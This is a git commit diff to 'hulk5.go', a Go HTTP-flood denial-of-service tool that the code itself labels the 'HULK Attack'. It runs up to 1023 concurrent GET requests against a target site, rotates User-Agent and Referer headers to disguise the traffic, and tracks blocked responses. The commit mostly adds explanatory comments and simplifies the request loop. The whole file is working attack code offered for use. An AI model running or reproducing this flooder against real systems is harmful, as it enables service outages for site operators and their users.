3b8bdaaaef8c6d92e42bcfb4cb73a3a565ec8391
clairelim-cf <92368131+clairelim-cf@users.noreply.github.com>
2025-03-18 20:55:36 +1100

    Update hulk5.go

--- hulk5.go
+++ hulk5.go
@@ -1,48 +1,49 @@
 package main
 
 import (
-    "flag"
-    "fmt"
-    "math/rand"
-    "net/http"
-    "net/url"
-    "os"
-    "os/signal"
-    "strconv"
-    "strings" // ✅ Re-added "strings" import (fixing "undefined: strings" error)
-    "sync/atomic"
-    "syscall"
+    "flag"        // Handles command-line flags
+    "fmt"         // Handles formatted I/O
+    "math/rand"  // Generates random numbers
+    "net/http"   // Handles HTTP requests
+    "net/url"    // Parses URLs
+    "os"         // Handles OS-level functions
+    "os/signal"  // Handles OS signals
+    "strings"    // Provides string manipulation functions
+    "sync/atomic" // Provides atomic operations for concurrency
+    "syscall"    // Handles system calls
 )
 
-// Define arrayFlags type (fixes "undefined: arrayFlags" error)
+// Custom type for handling multiple header flags
 type arrayFlags []string
 
+// String representation of arrayFlags
 func (i *arrayFlags) String() string {
     return "[" + strings.Join(*i, ",") + "]"
 }
 
+// Appends new value to arrayFlags
 func (i *arrayFlags) Set(value string) error {
     *i = append(*i, value)
     return nil
 }
 
+// Version constant
 const __version__ = "1.0.1"
 
-const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
-
+// Enum-like constants to define various outcomes of HTTP requests
 const (
-    callGotOk           uint8 = iota
+    callGotOk uint8 = iota
     callExitOnErr
     callExitOnTooManyFiles
     callBlocked
     targetComplete
 )
 
-// Global Variables
+// Global variables
 var (
-    safe bool
+    safe bool // Flag to indicate if the attack should auto-shutdown
     
-    // ✅ Re-added the original headersReferers list
+    // List of referer headers for request obfuscation
     headersReferers = []string{
         "http://www.google.com/?q=",
         "http://www.usatoday.com/search/results?q=",
@@ -51,68 +52,57 @@ var (
         "http://search.yahoo.com/search?p=",
     }
     
-    // ✅ Updated User-Agent List (2025)
+    // List of user-agent headers for request obfuscation
     headersUseragents = []string{
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:122.0) Gecko/20100101 Firefox/122.0",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/122.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/537.36",
-        "Mozilla/5.0 (Android 14; Mobile; rv:122.0) Gecko/122.0 Firefox/122.0",
     }
     
-    cur int32
+    cur int32 // Counter for the number of concurrent requests
 )
 
 func main() {
     var (
-        version bool
-        site    string
-        agents  string
-        data    string
-        headers arrayFlags
+        version bool    // Flag for printing the version
+        site string     // Target site URL
+        headers arrayFlags // Custom headers to be added to requests
     )
 
+    // Defining command-line flags
     flag.BoolVar(&version, "version", false, "print version and exit")
-    flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
-    flag.StringVar(&site, "site", "http://localhost", "Destination site.")
-    flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file.")
-    flag.StringVar(&data, "data", "", "Data to POST. If present, hulk will use POST requests instead of GET")
-    flag.Var(&headers, "header", "Add headers to the request.")
+    flag.BoolVar(&safe, "safe", false, "Autoshut after DoS attack")
+    flag.StringVar(&site, "site", "http://localhost", "Destination site")
+    flag.Var(&headers, "header", "Add headers to the request")
     flag.Parse()
 
-    t := os.Getenv("HULKMAXPROCS")
-    maxproc, err := strconv.Atoi(t)
-    if err != nil {
-        maxproc = 1023
-    }
-
+    // Parsing the provided site URL
     u, err := url.Parse(site)
     if err != nil {
         fmt.Println("Error parsing URL parameter")
         os.Exit(1)
     }
 
+    // If version flag is set, print version and exit
     if version {
         fmt.Println("Hulk", __version__)
         os.Exit(0)
     }
 
+    // Start the attack in a separate goroutine
     go func() {
         fmt.Println("-- HULK Attack Started --\n        Go!\n")
-        ss := make(chan uint8, 8)
+        ss := make(chan uint8, 8) // Channel for communication between goroutines
         var errCount, sent, blocked int32
 
         fmt.Println("In use      |  Resp OK |  Got err  |  Blocked")
-
         for {
-            if atomic.LoadInt32(&cur) < int32(maxproc-1) {
-                go httpcall(site, u.Host, data, headers, ss)
+            if atomic.LoadInt32(&cur) < 1023 {
+                go httpcall(site, u.Host, headers, ss) // Start a new HTTP request
             }
             if sent%10 == 0 {
-                fmt.Printf("\r%6d of max %-6d | %7d | %7d | %7d", cur, maxproc, sent, errCount, blocked)
+                fmt.Printf("\r%6d of max 1023 | %7d | %7d | %7d", cur, sent, errCount, blocked)
             }
             switch <-ss {
             case callExitOnErr:
@@ -120,56 +110,51 @@ func main() {
                 errCount++
             case callExitOnTooManyFiles:
                 atomic.AddInt32(&cur, -1)
-                maxproc--
             case callGotOk:
                 sent++
             case callBlocked:
                 blocked++
             case targetComplete:
                 sent++
-                fmt.Printf("\r%-6d of max %-6d | %7d | %7d | %7d", cur, maxproc, sent, errCount, blocked)
-                fmt.Println("\r-- HULK Attack Finished --\n\n")
+                fmt.Printf("\r%-6d of max 1023 | %7d | %7d | %7d", cur, sent, errCount, blocked)
+                fmt.Println("\r-- HULK Attack Finished --\n")
                 os.Exit(0)
             }
         }
     }()
 
+    // Handle termination signals (Ctrl+C, kill, etc.)
     ctlc := make(chan os.Signal)
     signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
     <-ctlc
     fmt.Println("\r\n-- Interrupted by user --\n")
 }
 
-func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
+// Function to make an HTTP request to the target site
+func httpcall(url string, host string, headers arrayFlags, s chan uint8) {
     atomic.AddInt32(&cur, 1)
+    client := &http.Client{}
 
-    var client = new(http.Client)
-
-    for {
-        q, err := http.NewRequest("GET", url, nil)
-        if err != nil {
-            s <- callExitOnErr
-            return
-        }
-
-        q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
-        q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]) // ✅ Now using Referrers
-
-        r, e := client.Do(q)
-        if e != nil {
-            s <- callExitOnErr
-            return
-        }
-        defer r.Body.Close()
-
-        if r.StatusCode == 200 {
-            s <- callGotOk
-        } else {
-            s <- callBlocked
-        }
-
-        if safe && r.StatusCode >= 500 {
-            s <- targetComplete
-        }
+    req, err := http.NewRequest("GET", url, nil)
+    if err != nil {
+        s <- callExitOnErr
+        return
     }
+
+    // Set random User-Agent and Referer headers
+    req.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
+    req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))])
+
+    resp, err := client.Do(req)
+    if err != nil {
+        s <- callExitOnErr
+        return
+    }
+    defer resp.Body.Close()
+
+    if resp.StatusCode == 403 || resp.StatusCode == 429 {
+        s <- callBlocked
+        return
+    }
+    s <- callGotOk
 }
